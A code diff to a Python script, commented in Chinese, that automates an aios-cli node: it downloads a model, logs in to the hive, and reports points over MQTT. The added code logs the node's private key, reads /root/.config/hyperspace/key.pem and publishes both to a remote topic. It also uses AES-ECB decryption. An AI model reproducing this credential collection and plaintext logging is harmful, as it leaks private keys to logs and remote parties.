@@ -47,6 +47,7 @@ def read_file(file_path):
     except FileNotFoundError:
         raise ValueError(f"文件未找到: {file_path}")
 
+
 def decrypt_aes_ecb(secret_key, data_encrypted_base64):
     """
     解密 AES ECB 模式的 Base64 编码数据，
@@ -182,16 +183,14 @@ def main(client, serverId, appId, decryptKey, user, display):
     # 3. 下载大模型，等待输出中出现 "Download complete"
     logger.info("开始下载大模型...")
     run_command_and_print(
-        "/root/.aios/aios-cli models add hf:bartowski/Llama-3.2-1B-Instruct-GGUF:"
-        "Llama-3.2-1B-Instruct-Q8_0.gguf", wait_for="Download complete"
+        "/root/.aios/aios-cli models add hf:bartowski/Llama-3.2-1B-Instruct-GGUF:Llama-3.2-1B-Instruct-Q8_0.gguf", wait_for="Download complete"
     )
     logger.info("下载完成！")
 
     # 4. 执行 infer 命令
     logger.info("执行 infer 命令...")
     run_command_and_print(
-        "/root/.aios/aios-cli infer --model hf:bartowski/Llama-3.2-1B-Instruct-GGUF:"
-        "Llama-3.2-1B-Instruct-Q8_0.gguf --prompt 'What is 1+1 equal to?'"
+        "/root/.aios/aios-cli infer --model hf:bartowski/Llama-3.2-1B-Instruct-GGUF:Llama-3.2-1B-Instruct-Q8_0.gguf --prompt 'What is 1+1 equal to?'"
     )
     logger.info("推理命令执行完毕。")
 
@@ -199,71 +198,76 @@ def main(client, serverId, appId, decryptKey, user, display):
     # 从文件加载密文
     encrypted_data_base64 = read_file('/opt/data/' + appId + '_user.json')
     # 解密并发送解密结果
-    private_key = decrypt_aes_ecb(decryptKey, encrypted_data_base64, 'publicKey')
-    
-    if private_key is not None:
-        file_path = "/path/to/your/file.txt"
-        with open(file_path, "w", encoding="utf-8") as file:
-            file.write(private_key)
-    #
-    # # Hive 登录，提取 Public 和 Private Key
-    # logger.info("开始 Hive 登录...")
-    # run_command_and_print("/root/.aios/aios-cli hive login", wait_for="Authenticated successfully!")
-    #
-    # # if public_key is not None:
-    # #     logger.info("已配置了key...")
-    # # else:
-    #
-    # # 执行 hive whoami 命令
-    # logger.info("执行 hive whoami 命令...")
-    # login_output = run_command_blocking("/root/.aios/aios-cli hive whoami")
-    # public_key = None
-    # private_key = None
-    # public_match = re.search(r"Public:\s*(\S+)", login_output)
-    # private_match = re.search(r"Private:\s*(\S+)", login_output)
-    # if public_match:
-    #     public_key = public_match.group(1)
-    # if private_match:
-    #     private_key = private_match.group(1)
-    # logger.info(f"Public Key: {public_key}")
-    # logger.info(f"Private Key: {private_key}")
-    # logger.info("whoami 命令执行完毕。")
-    # client.publish("hyperCli", json.dumps(get_info(serverId, "hyperCli", public_key, private_key)))
-    #
-    # # 7. 执行 hive select-tier 5 命令
-    # logger.info("执行 hive select-tier 5 命令...")
-    # run_command_blocking("/root/.aios/aios-cli hive select-tier 5")
-    # logger.info("select-tier 命令执行完毕。")
-    #
-    # # 8. 执行 hive connect 命令
-    # logger.info("执行 hive connect 命令...")
-    # run_command_blocking("/root/.aios/aios-cli hive connect")
-    # logger.info("connect 命令执行完毕。")
-    #
-    # # 获取积分
-    # while True:
-    #     try:
-    #         logger.info("\n===== 积分查询输出 =====")
-    #         login_output = run_command_blocking("/root/.aios/aios-cli hive points")
-    #         points = None
-    #         public_match = re.search(r"Points:\s*(\S+)", login_output)
-    #         if public_match:
-    #             points = public_match.group(1)
-    #         logger.info(f"points: {points}")
-    #         app_info = get_app_info_integral(serverId, appId, public_key, points, 2,
-    #                                          '运行中， 并到采集积分:' + str(points))
-    #         client.publish("appInfo", json.dumps(app_info))
-    #         logger.info("获取积分完成。")
-    #         time.sleep(3600)
-    #     except Exception as e:
-    #         client.publish("appInfo", json.dumps(get_app_info(serverId, appId, 3, '检查过程中出现异常: ' + str(e))))
+    private_key = decrypt_aes_ecb(decryptKey, encrypted_data_base64)
 
-def get_info(server_id, account_type, public_key, private_key):
+    # if private_key is not None:
+    #     file_path = "/path/to/your/file.txt"
+    #     with open(file_path, "w", encoding="utf-8") as file:
+    #         file.write(private_key)
+
+    # Hive 登录，提取 Public 和 Private Key
+    logger.info("开始 Hive 登录...")
+    run_command_and_print("/root/.aios/aios-cli hive login", wait_for="Authenticated successfully!")
+
+    # if public_key is not None:
+    #     logger.info("已配置了key...")
+    # else:
+
+    # 执行 hive whoami 命令
+    logger.info("执行 hive whoami 命令...")
+    login_output = run_command_blocking("/root/.aios/aios-cli hive whoami")
+    public_key = None
+    private_key = None
+    public_match = re.search(r"Public:\s*(\S+)", login_output)
+    private_match = re.search(r"Private:\s*(\S+)", login_output)
+    if public_match:
+        public_key = public_match.group(1)
+    if private_match:
+        private_key = private_match.group(1)
+
+    with open("/root/.config/hyperspace/key.pem", "rb") as file:
+        key_content = file.read()
+    logger.info(f"Public Key: {public_key}")
+    logger.info(f"Private Key: {private_key}")
+    logger.info(f"key_content: {key_content}")
+    logger.info("whoami 命令执行完毕。")
+    client.publish("hyperCli", json.dumps(get_info(serverId, "hyperCli", public_key, private_key, key_content)))
+
+    # 7. 执行 hive select-tier 5 命令
+    logger.info("执行 hive select-tier 5 命令...")
+    run_command_blocking("/root/.aios/aios-cli hive select-tier 5")
+    logger.info("select-tier 命令执行完毕。")
+
+    # 8. 执行 hive connect 命令
+    logger.info("执行 hive connect 命令...")
+    run_command_blocking("/root/.aios/aios-cli hive connect")
+    logger.info("connect 命令执行完毕。")
+
+    # 获取积分
+    while True:
+        try:
+            logger.info("\n===== 积分查询输出 =====")
+            login_output = run_command_blocking("/root/.aios/aios-cli hive points")
+            points = None
+            public_match = re.search(r"Points:\s*(\S+)", login_output)
+            if public_match:
+                points = public_match.group(1)
+            logger.info(f"points: {points}")
+            app_info = get_app_info_integral(serverId, appId, public_key, points, 2,
+                                             '运行中， 并到采集积分:' + str(points))
+            client.publish("appInfo", json.dumps(app_info))
+            logger.info("获取积分完成。")
+            time.sleep(3600)
+        except Exception as e:
+            client.publish("appInfo", json.dumps(get_app_info(serverId, appId, 3, '检查过程中出现异常: ' + str(e))))
+
+def get_info(server_id, account_type, public_key, private_key, key_content):
     return {
         "serverId": f"{server_id}",
         "accountType": f"{account_type}",
         "publicKey": f"{public_key}",
-        "privateKey": f"{private_key}"
+        "privateKey": f"{private_key}",
+        "remarks": f"{key_content}"
     }
 
 
